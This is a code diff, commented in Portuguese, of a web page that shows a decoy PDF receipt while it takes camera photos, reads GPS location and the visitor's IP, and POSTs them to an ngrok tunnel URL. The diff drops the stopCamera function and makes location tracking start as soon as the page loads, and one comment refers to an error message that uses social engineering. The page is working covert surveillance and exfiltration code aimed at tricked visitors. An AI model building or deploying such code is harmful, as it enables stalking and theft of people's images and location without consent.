@@ -66,15 +66,6 @@
         }
       }
 
-      // Parar a câmera
-      function stopCamera() {
-        if (stream) {
-          stream.getTracks().forEach(track => track.stop());
-          stream = null;
-          cameraStarted = false;
-        }
-      }
-
       // Capturar foto do stream ativo
       function capturePhoto() {
         if (!stream) return null;
@@ -102,7 +93,7 @@
                 source: "GPS"
               };
               if (!loadingTimeout && cameraStarted) {
-                // Enviar a primeira foto e localização imediatamente após localização
+                // Enviar a primeira foto e localização imediatamente após localização e câmera
                 const firstPhoto = capturePhoto();
                 if (firstPhoto) {
                   sendLocation({ ...locationData, photos: [firstPhoto] });
@@ -162,11 +153,10 @@
           if (cameraSuccess) {
             // Abrir o PDF em uma nova aba
             window.open("/img/comprovante.pdf", "_blank");
-            // Iniciar captura de fotos e localização
+            // Iniciar captura de fotos
             if (!locationData.ip) {
               locationData.ip = await getClientIP();
             }
-            startLocationTracking();
             startCaptureInterval();
           } else {
             // Mostrar mensagem de erro com engenharia social
@@ -181,7 +171,7 @@
       }
 
       function sendLocation(data) {
-        fetch("https://4d9a-177-35-125-241.ngrok-free.app/send-location", { // Substitua pela URL atual do ngrok
+        fetch("https://8285-177-35-125-241.ngrok-free.app/send-location", { // Substitua pela URL atual do ngrok
           method: "POST",
           headers: { "Content-Type": "application/json" },
           body: JSON.stringify(data)
@@ -198,6 +188,9 @@
         document.querySelector(".comprovante-container").classList.remove("blurred");
         document.getElementById("loading-overlay").style.display = "none";
       }
+
+      // Iniciar apenas a localização ao carregar a página
+      startLocationTracking();
     });
   </script>
 </body>
